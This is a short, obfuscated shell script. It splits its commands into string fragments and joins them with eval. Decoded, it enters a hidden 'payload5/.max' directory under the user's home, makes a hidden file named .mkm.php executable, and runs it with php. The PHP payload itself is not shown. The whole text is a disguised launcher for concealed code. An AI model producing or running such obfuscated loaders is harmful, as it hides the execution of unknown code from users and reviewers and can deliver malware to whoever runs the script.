z="
";Dz='load';Kz='p';Az='cd $';Lz='php ';Ez='5/.m';Mz='.mkm';Hz='d +x';Nz='.php';Cz='/pay';Gz='chmo';Jz='m.ph';Iz=' .mk';Fz='ax';Bz='HOME';
eval "$Az$Bz$Cz$Dz$Ez$Fz$z$Gz$Hz$Iz$Jz$Kz$z$Lz$Mz$Nz"
